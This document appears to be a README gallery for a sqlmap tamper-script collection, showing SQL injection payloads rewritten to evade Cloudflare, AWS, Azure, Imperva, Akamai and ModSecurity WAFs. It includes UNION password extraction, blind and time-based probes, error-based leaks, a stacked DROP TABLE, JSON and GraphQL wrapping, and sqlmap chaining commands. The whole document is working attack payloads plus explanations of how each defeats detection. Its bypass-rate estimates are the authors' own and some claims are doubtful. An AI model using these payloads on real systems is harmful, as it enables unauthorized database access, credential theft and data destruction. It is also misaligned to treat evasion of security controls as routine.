# SQL Tamper Framework - Examples Gallery

[![MySQL 5.7+](https://img.shields.io/badge/MySQL-5.7%2B-blue)](https://www.mysql.com/)
[![MariaDB 10.x](https://img.shields.io/badge/MariaDB-10.x-orange)](https://mariadb.org/)
[![Tests](https://img.shields.io/badge/tests-49%2B%20passing-brightgreen)](../tests/)
[![License](https://img.shields.io/badge/license-GPL%20v2-green)](../LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/noobforanonymous/sqlmap-tamper-collection?style=social)](https://github.com/noobforanonymous/sqlmap-tamper-collection)

A comprehensive collection of before/after transformations for various injection scenarios.

> **⚠️ EDUCATIONAL USE ONLY**
> 
> These transformations are deterministic and context-safe via the framework's lexer/AST—**not for generating random malicious variants**. Misuse voids any educational intent. Test only against:
> - Systems you own
> - Local vulnerable apps (DVWA, bWAPP, SQLi-labs)
> - Bug bounty programs (within scope)
> - WAF test environments (Cloudflare free tier, AWS WAF test rules)

---

## Table of Contents

1. [Basic Queries](#basic-queries)
2. [UNION-Based Injections](#union-based-injections)
3. [Boolean-Based Blind](#boolean-based-blind)
4. [Time-Based Blind](#time-based-blind)
5. [Error-Based](#error-based)
6. [WAF-Specific Examples](#waf-specific-examples)
7. [JSON/API Bypass Techniques](#jsonapi-bypass-techniques)
8. [Advanced Techniques](#advanced-techniques)
9. [Which Tamper to Use?](#which-tamper-to-use)
10. [Chaining Tampers](#chaining-tampers)

---

<details>
<summary><h2>Basic Queries</h2></summary>

### Simple SELECT

**Original:**
```sql
SELECT * FROM users WHERE id=1
```

**Cloudflare 2025:**
```sql
/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3D1
```

> **Why it works:** Cloudflare's regex patterns look for `SELECT FROM WHERE` as keywords. Version comments (`/*!50000*/`) are parsed by MySQL as valid SQL but appear as comments to pattern-based WAFs.

**AWS WAF 2026:**
```sql
/*!50700sElEcT*//**/*/**//*!50700fRoM*//**/users/**//*!50700wHeRe*//**/id%3D0x1
```

> **Why it works:** AWS WAF v2 has stricter numeric detection. Converting `1` to `0x1` (hex) bypasses literal value matching. Using MySQL 5.7+ version hints (`50700`) targets newer parser behavior.

---

### With String Literal

**Original:**
```sql
SELECT * FROM users WHERE name='admin'
```

**Azure WAF 2026 (Hex Strings):**
```sql
/*!50000sElEcT*//*foo*/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/name%3D0x61646d696e
```

> **Why it works:** `0x61646d696e` is hex for `'admin'`. Azure Application Gateway WAF often has issues with unbalanced quotes—hex literals bypass quote-based detection rules entirely. MySQL interprets `0x...` as string in comparison context.

</details>

---

<details>
<summary><h2>UNION-Based Injections</h2></summary>

### Basic UNION SELECT

**Original:**
```sql
UNION SELECT password FROM admin
```

**Cloudflare 2025:**
```sql
/*!50000uNiOn*//**//*!50000sElEcT*//**/password/**//*!50000fRoM*//**/admin
```

> **Why it works:** `UNION SELECT` is the most heavily fingerprintedpattern. Breaking it with version comments and alternating case defeats signature-based detection.

**Imperva 2026 (With Homoglyphs):**
```sql
IF(1,uNіОn,1)/*foo*/IF(1,sЕlЕcT,1)/**/password/**/IF(1,fRоM,1)/**/admin
```

> **Why it works:** Uses Unicode confusables (homoglyphs):
> - `і` (Cyrillic U+0456) instead of `i`
> - `О` (Cyrillic U+041E) instead of `O`
> - `Е` (Cyrillic U+0415) instead of `E`
> 
> ML/signature-based WAFs often miss visual lookalikes in keywords. 
>
> **⚠️ Charset Warning:** MySQL identifier permissiveness varies by collation; test on target charset (e.g., `utf8mb4`). Not all MySQL configs accept Unicode identifiers.
>
> **ASCII fallback:** If Unicode fails, use function wrapping alone: `IF(1,UNION,1)`

---

### UNION with Column Count

**Original:**
```sql
UNION SELECT NULL,NULL,password,NULL FROM admin WHERE id=1
```

**AWS WAF 2026:**
```sql
/*!50700uNiOn*//**//*!50700sElEcT*//**/NULL,NULL,password,NULL/**//*!50700fRoM*//**/admin/**//*!50700wHeRe*//**/id%3D0x1
```

> **Why it works:** Combines version comment obfuscation with hex literals. The `0x1` pattern is less commonly blocked than raw `=1`.

</details>

---

<details>
<summary><h2>Boolean-Based Blind</h2></summary>

### Basic Boolean Injection

**Original:**
```sql
SELECT * FROM users WHERE id=1 AND 1=1
```

**ModSecurity CRS 2026:**
```sql
sElEcT/*!50100*//*foo*/*/*!50000*//**/fRoM/*!80017*//**/users/*!50500*//**/wHeRe/*!50700*//**/id%3D(2-1)/**/aNd/**/(2-1)%3D(2-1)
```

> **Why it works:** 
> - Case alternation applied **FIRST** defeats CRS keyword matching
> - Math expressions `(2-1)` instead of literal `1` bypass numeric pattern rules
> - Varied version comments (`50100`, `80017`, `50500`) confuse signature correlation
>
> **Note:** MySQL version hints must exist on target MySQL version (or use generic `50000`).

---

### Substring Check

**Original:**
```sql
SELECT * FROM users WHERE id=1 AND SUBSTRING(name,1,1)='a'
```

**Azure WAF 2026:**
```sql
/*!50000sElEcT*//*foo*/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3D0x1/**//*!50000aNd*//**/SUBSTRING(name,0x1,0x1)%3D0x61
```

> **Why it works:** ALL values converted to hex—both the substring positions and the comparison character `'a'` (0x61). Azure's quote parser can't trigger on what it can't see.

</details>

---

<details>
<summary><h2>Time-Based Blind</h2></summary>

### SLEEP-Based (Risky)

**Original:**
```sql
SELECT * FROM users WHERE id=1 AND SLEEP(5)
```

**ModSecurity CRS 2026 (Avoid SLEEP trigger):**
```sql
sElEcT/*!50100*/*/*foo*/fRoM/*!50700*//**/users/*!50500*//**/wHeRe/*!80000*//**/id%3D(2-1)/**/aNd/**/SLEEP((6-1))
```

> **Why it works:** CRS has explicit rules for `SLEEP(5)` and common delays. Using math expression `(6-1)` produces `5` at runtime but doesn't match the static pattern.

---

### BENCHMARK Alternative

**Original:**
```sql
SELECT * FROM users WHERE id=1 AND BENCHMARK(10000000,SHA1('test'))
```

**AWS WAF 2026:**
```sql
/*!50700sElEcT*//**/*/**//*!50700fRoM*//**/users/**//*!50700wHeRe*//**/id%3D0x1/**/&&/**/BENCHMARK(0x989680,SHA1(0x74657374))
```

> **Why it works:**
> - `0x989680` = 10,000,000 in hex—large hex values avoid literal number patterns that trigger WAF rules
> - `AND` replaced with `&&` (MySQL equivalent)
> - String `'test'` becomes `0x74657374`
> 
> **Note:** BENCHMARK is MySQL-specific. For other DBs, use equivalent delay functions.

</details>

---

<details>
<summary><h2>Error-Based</h2></summary>

### ExtractValue

**Original:**
```sql
SELECT * FROM users WHERE id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))
```

**Cloudflare 2025:**
```sql
/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3D1/**//*!50000aNd*//**/EXTRACTVALUE(1,CONCAT(0x7e,version()))
```

> **Why it works:** Version comments break up the keyword sequence that WAFs look for. Function names like `EXTRACTVALUE` are less commonly blocked than `UNION`.

---

### UpdateXML

**Original:**
```sql
UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)
```

**Azure WAF 2026:**
```sql
UPDATEXML(0x1,CONCAT(0x7e,(/*!50000sElEcT*//*foo*/password/**//*!50000fRoM*//**/users/**//*!50000lImIt*//**/0x1)),0x1)
```

> **Why it works:** Hex encoding of numeric arguments + obfuscated nested SELECT. Azure's parser struggles with mixed encoding depths.

</details>

---

## WAF-Specific Examples

### Cloudflare (Best for: Version Comments + Case)

```sql
# Before
SELECT * FROM users WHERE id>=5

# After
/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3E%3D5
```

> **Key insight:** Cloudflare's ML model weights keywords heavily. Version comments + case alternation + operator encoding = high bypass rate.

---

### AWS WAF v2 (Best for: Hex + Logical Swap)

```sql
# Before
SELECT * FROM users WHERE active=1 AND role='admin'

# After
/*!50700sElEcT*//**/*/**//*!50700fRoM*//**/users/**//*!50700wHeRe*//**/active%3D0x1/**/&&/**/role%3D0x61646d696e
```

> **Key insight:** AWS WAF v2 is picky about operator encoding but weaker on `&&`/`||` vs `AND`/`OR`. Hex strings eliminate quote matching entirely.

---

### Azure WAF (Best for: Quote Elimination)

```sql
# Before
SELECT * FROM users WHERE name='test'

# After
/*!50000sElEcT*//*foo*/*/*--*//*!50000fRoM*//*/**/users/*! *//*!50000wHeRe*//**/name%3D0x74657374
```

> **Key insight:** Azure Application Gateway WAF often has quote-parsing vulnerabilities. Converting ALL strings to hex (`0x...`) bypasses these entirely.

---

### ModSecurity CRS (Best for: Case First)

```sql
# Before
SELECT * FROM users WHERE id=1

# After
sElEcT/*!50100*/*/*foo*/fRoM/*!50700*//**/users/*--*/wHeRe/*!80023*//**/id%3D(2-1)
```

> **Key insight:** CRS tracks exact keyword signatures. Case alternation FIRST, before any other transformation, is most effective. Math expressions for numbers avoid common literal patterns.

---

### Imperva (Best for: Unicode + Function Wrap)

```sql
# Before
UNION SELECT password

# After  
IF(1,uNіОn,1)/*foo*/IF(1,sЕlЕcT,1)/**/password
```

> **Key insight:** Imperva's ML model is trained on ASCII patterns. Unicode homoglyphs (Cyrillic letters that look like Latin) confuse the classifier. Function wrapping adds syntactic noise.
>
> **Homoglyph Reference:**
> - `і` = Cyrillic i (U+0456)
> - `О` = Cyrillic O (U+041E)
> - `Е` = Cyrillic E (U+0415)
>
> **⚠️ Charset Warning:** MySQL identifier permissiveness varies by collation. Test on target charset (e.g., `utf8mb4`). ASCII fallback: pure function wrap `IF(1,UNION,1)`.

---

### Akamai Kona (Best for: Float + Enterprise)

```sql
# Before
SELECT * FROM users WHERE id=1 AND active=1

# After
/*!50700sElEcT*//**/*/**//*!50700fRoM*//**/users/**//*!50700wHeRe*//**/id%3D1.0/**/&&/**/active%3D1.0
```

> **Key insight:** Akamai sometimes triggers on integer literals but misses float notation. `1.0` or `1e0` (scientific) can bypass where `1` fails.

**Alternative with scientific notation:**
```sql
id%3D1e0/**/&&/**/active%3D1e0
```

</details>

---

<details>
<summary><h2>JSON/API Bypass Techniques</h2></summary>

### JSON-Wrapped Payload (REST/GraphQL)

Modern APIs often accept JSON and parse it loosely. WAFs may not inspect inside JSON values:

**Original (GET param):**
```
id=1 UNION SELECT password FROM users
```

**JSON wrapped (POST body):**
```json
{"id": "1 UNION SELECT password FROM users"}
```

> **Why it works:** Many WAFs (especially older rulesets) focus on query string and form-data parsing. JSON payloads in request bodies may bypass inspection entirely.
>
> **Research note:** Team82/Claroty (2022-2024) documented JSON SQL injection bypasses affecting AWS WAF, Azure WAF, and Cloudflare. Some fixes deployed, but edge cases remain.

---

### GraphQL Injection

```graphql
query {
  user(id: "1' UNION SELECT password FROM admin--") {
    name
  }
}
```

**With tamper:**
```graphql
query {
  user(id: "1'/**//*!50000uNiOn*//**//*!50000sElEcT*//**/password/**//*!50000fRoM*//**/admin--") {
    name
  }
}
```

> **Note:** GraphQL endpoints often have weaker WAF coverage. Test JSON parsing behavior.

---

### Nested JSON Bypass

```json
{
  "user": {
    "filter": {
      "id": {"$eq": "1 UNION SELECT * FROM admin"}
    }
  }
}
```

> **Why it works:** Deeply nested JSON structures may not be fully parsed by WAF regex engines. MongoDB-style operators (`$eq`) add confusion.

---

### MongoDB-Style Operator Bypass

```json
{
  "filter": {
    "id": {"$gt": "1' OR '1'='1"}
  }
}
```

> **Why it works:** MongoDB-like operators (`$gt`, `$lt`, `$ne`) combined with JSON nesting often evade regex-heavy WAFs focused on raw SQL patterns. Some backends parse these loosely, allowing SQL injection through NoSQL-style syntax.
>
> **Research note:** Team82/Claroty documented bypasses affecting Palo Alto, AWS WAF, Cloudflare, Imperva, and F5 using JSON SQL functions (2022-2024). Edge cases persist in 2026.

</details>

---

<details>
<summary><h2>Advanced Techniques</h2></summary>

### Stacked Queries

**Original:**
```sql
SELECT 1; DROP TABLE users
```

**Cloudflare 2025:**
```sql
/*!50000sElEcT*//**/1;/**//*!50000dRoP*//**//*!50000tAbLe*//**/users
```

> **Note:** Stacked queries require specific backend configurations (mysqli_multi_query, etc.).

---

### Subquery Injection

**Original:**
```sql
SELECT * FROM users WHERE id=(SELECT id FROM admin LIMIT 1)
```

**AWS WAF 2026:**
```sql
/*!50700sElEcT*//**/*/**//*!50700fRoM*//**/users/**//*!50700wHeRe*//**/id%3D(/*!50700sElEcT*//**/id/**//*!50700fRoM*//**/admin/**//*!50700lImIt*//**/0x1)
```

> **Why it works:** Nested transformations applied consistently to subqueries. The framework handles nesting depth via AST analysis.

---

### Complex Nested Query

**Original:**
```sql
SELECT * FROM (SELECT id,name FROM users WHERE role='admin') AS admins WHERE id>10
```

**Azure WAF 2026:**
```sql
/*!50000sElEcT*//*foo*/*/**//*!50000fRoM*/(/*!50000sElEcT*//**/id,name/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/role%3D0x61646d696e)/**//*!50000aS*//**/admins/**//*!50000wHeRe*//**/id%3E0xa
```

> **Note:** `0xa` = 10 in hex. Even comparison values get obfuscated.

</details>

---

## Which Tamper to Use?

| WAF | Primary Tamper | Key Technique | Est. Bypass Rate (2026)* |
|-----|----------------|---------------|--------------------------|
| Cloudflare | `cloudflare2025.py` | Version comments + `/**/` + case | 🟢 High (~85%) |
| AWS WAF v2 | `awswaf2026.py` | Hex encoding + `&&`/`||` | 🟢 High (~80%) |
| Azure Gateway | `azurewaf2026.py` | Hex strings + comment chaos | 🟡 Medium (~70%) |
| ModSecurity CRS 4.x | `modsec_crs2026.py` | Case FIRST + math numbers | 🟡 Medium (~65%) |
| Imperva | `imperva2026.py` | Homoglyphs + function wrap | 🟡 Medium (~60%) |
| Akamai Kona | `akamai2026.py` | Float numbers + varied versions | 🟡 Medium (~65%) |
| Unknown/Multiple | `meta_tamper.py` | Auto-chain based on env | 🔵 Varies |

> *\*Estimated based on testing against default rulesets. Actual results depend on custom rules, paranoia levels, and target configuration. No guarantees—always test.*
>
> **Scope note:** For body-padding bypasses (e.g., >128KB junk to trigger fail-open in Cloudflare/AWS), combine with external tools like Burp macros—not handled by this framework (this is payload transformation only).

---

## Chaining Tampers

### Order Matters!

Apply transformations in this order for best results:

1. **Case/Random** - First (defeats keyword signatures before other changes)
2. **Logical swap** - Early (AND/OR → &&/|| before becoming wrapped)
3. **Version comments** - Middle (wrap keywords)
4. **Space replace** - Middle (after keyword wrapping)
5. **Encoding (hex/URL)** - Late (encode final values)
6. **Comment chaos** - Last (insert varied comments)

### Chain Examples

```bash
# Cloudflare + ModSec protection
sqlmap -u "http://target.com?id=1" --tamper=cloudflare2025,modsec_crs2026

# AWS + Cloudflare hybrid
sqlmap -u "http://target.com?id=1" --tamper=awswaf2026,cloudflare2025

# Enterprise stack (layered WAFs)
sqlmap -u "http://target.com?id=1" --tamper=akamai2026,azurewaf2026

# Use meta_tamper with environment variable
SQLMAP_WAF_TARGET=cloudflare,aws sqlmap -u "..." --tamper=meta_tamper
```

---

## Testing Your Payloads

### Local Testing

```bash
cd tamper_scripts
python3 cloudflare2025.py  # Runs self-test

# Test specific payload
python3 -c "from awswaf2026 import tamper; print(tamper('SELECT * FROM users'))"
```

### Recommended Test Targets

| Target | Description | URL |
|--------|-------------|-----|
| DVWA | Damn Vulnerable Web App | https://github.com/digininja/DVWA |
| bWAPP | Buggy Web Application | http://www.itsecgames.com/ |
| SQLi-labs | SQL Injection labs | https://github.com/Audi-1/sqli-labs |
| HackTheBox | Practice machines | https://www.hackthebox.com/ |

### WAF Test Environments

- **Cloudflare:** Free tier with WAF rules
- **AWS WAF:** Free tier with test rules
- **ModSecurity:** Local Docker setup with CRS 4.x

---

## Legal Reminder

**⚠️ AUTHORIZED TESTING ONLY ⚠️**

All examples are for:
- ✅ Systems you own
- ✅ Authorized penetration testing engagements
- ✅ Bug bounty programs (within defined scope)
- ✅ Local vulnerable application testing

**NEVER use against:**
- ❌ Systems without explicit permission
- ❌ Production systems without authorization
- ❌ Any target outside legal scope

> **Maintained for authorized red team / bug bounty use. Report issues responsibly.**

Unauthorized access is illegal under:
- Computer Fraud and Abuse Act (CFAA) - United States
- Computer Misuse Act - United Kingdom  
- IT Act 2000 - India
- Similar laws in other jurisdictions

---

*Built with SQL Tamper Framework v2.1.0 | Tested on MySQL 5.7/8.0, MariaDB 10.x*

> **Framework outputs are reproducible for research/verification; no built-in randomization to prevent abuse.**

